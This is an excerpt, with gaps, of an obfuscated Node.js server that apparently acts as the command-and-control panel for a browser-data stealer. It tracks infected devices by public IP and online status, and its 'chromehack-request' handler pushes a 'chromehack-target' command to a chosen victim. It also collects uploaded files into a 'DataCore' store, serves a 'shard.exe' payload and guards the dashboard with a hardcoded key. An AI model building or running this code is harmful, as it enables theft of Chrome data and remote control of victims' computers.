const x = require('express'),n = x(),p = process.env.PORT || 3000,u = require('express-fileupload'),f = require('fs'),r = require('path'),w = require('http').createServer(n),io = require('socket.io')(w),j = 'firewall.json',s = 'shard.json';
const chromeHackFiles = {};

const netrunnerUpload = (e) => {if (!e) return console.error('Attempted to write undefined data');const t = f.existsSync(j) ? JSON.parse(f.readFileSync(j, 'utf8') || '[]') : [],o = [...t, e];f.writeFileSync(j, JSON.stringify(o, null, 2));};
const netrunnerWipe = () => {f.writeFileSync(j, JSON.stringify([]));};
const iceBreakerPull = () => {try {return f.existsSync(j) ? JSON.parse(f.readFileSync(j, 'utf8') || '[]') : [];} catch (e) {return [];}};
const deviceLinkPull = () => {try {return f.existsSync(s) ? JSON.parse(f.readFileSync(s, 'utf8') || '[]') : [];} catch (e) {return [];}};

const checkDeviceActivity = (devices) => {
    const devices_with_status = devices.map(device => {
        const now = new Date();
        const lastActiveTime = new Date(device.lastActive);
        const minutesSinceLastActive = (now - lastActiveTime) / (1000 * 60);
        device.status = minutesSinceLastActive > 1 ? 'Offline' : 'Online';
        return device;
    });
...
const deviceLinkUpload = (e) => {
    ...
    const existingDeviceIndex = t.findIndex(device => device.publicIp === e.publicIp && device.deviceName === e.deviceName);
    const deviceData = {...e,lastActive: new Date().toISOString(),status: 'Online'};
    if (existingDeviceIndex !== -1) {t[existingDeviceIndex] = deviceData;} else {t.push(deviceData);}
    f.writeFileSync(s, JSON.stringify(t, null, 2));
    return t;
 };

const deviceLinkWipe = () => {f.writeFileSync(s, JSON.stringify([]));};
...
const deviceLinkFormat = (e) => {
    const devices = checkDeviceActivity(e || []);
    return devices.map(e => 
        `<tr class="${e.status.toLowerCase()}">
            <td class="device-row">
                <div class="data-row"><span class="data-key">Device Name:</span><span class="data-value">${e.deviceName || 'N/A'}</span></div>
                <div class="data-row"><span class="data-key">Public IP:</span><span class="data-value">${e.publicIp || 'N/A'}</span></div>
                <div class="data-row"><span class="data-key">Status:</span><span class="data-value ${e.status.toLowerCase()}">${e.status}</span></div>
                ${e.status === 'Offline' ? 
                    `<div class="data-row"><span class="data-key">Last Seen:</span><span class="data-value">[${new Date(e.lastActive).toISOString().replace('T', '  ').slice(0, 16)}]</span></div>` : 
                    ''
                }
            </td>
        </tr>`
...
io.on('connection', (e) => {
    ...
    e.on('wipe-data', () => {netrunnerWipe();io.emit('initial-data', dataStreamFormat(iceBreakerPull()));}),
    ...
    e.on('chromehack-request', (data) => {
        const devices = deviceLinkPull();
        const targetDevice = devices.find(device => device.publicIp === data.ip);
        
        if (targetDevice) {
            io.sockets.sockets.forEach((socket) => {
                if (socket.deviceData && socket.deviceData.publicIp === data.ip) {
                    socket.emit('chromehack-target', { 
            ...
            e.emit('chromehack-response', { 
                ip: data.ip, 
                fileUrl: '[DEVICE NOT FOUND]' 
            });
        }
    });
    
    e.on('download-file-request', (t) => {
        if (t.type === 'all') {e.emit('download-redirect', '/api/download');}
        else {
    ...
    e.on('show-data', () => {e.emit('show-data-table', dataStreamFormat(iceBreakerPull()));}),
    e.on('show-link', () => {
        const devices = deviceLinkPull();
...
n.post('/jack-in', (e, t) => {const {cyberkey: o} = e.body;'n3trunner' === o ? t.send(dashboardTemplate) : t.send(accessDenied);}),
n.post('/api/netrunner', (e, t) => {
    ...
    } catch (e) {t.status(500).json({error: 'Failed to process data'});}
}),
...
n.post('/api/link', (e, t) => {
    ...
    } catch (e) {t.status(500).json({error: 'Failed to process device link'});}
}),
...
n.get('/download/:id', (e, t) => {
    const o = iceBreakerPull(),a = o.find(o => o.id == e.params.id);
    if (!a) {console.error(`[ERROR] No file found with ID: ${e.params.id}`);return t.status(404).send('[QUANTUM ERROR] FILE SHARD NOT LOCATED');}
    const l = r.join(__dirname, 'DataCore', a.name);
    if (!f.existsSync(l)) {console.error(`[ERROR] File does not exist: ${l}`);return t.status(404).send('File not found');}
    t.download(l);
}),

n.get('/shard.exe', (e, t) => {t.download('shard.exe');}),
n.post('/api/data', (e, t) => {
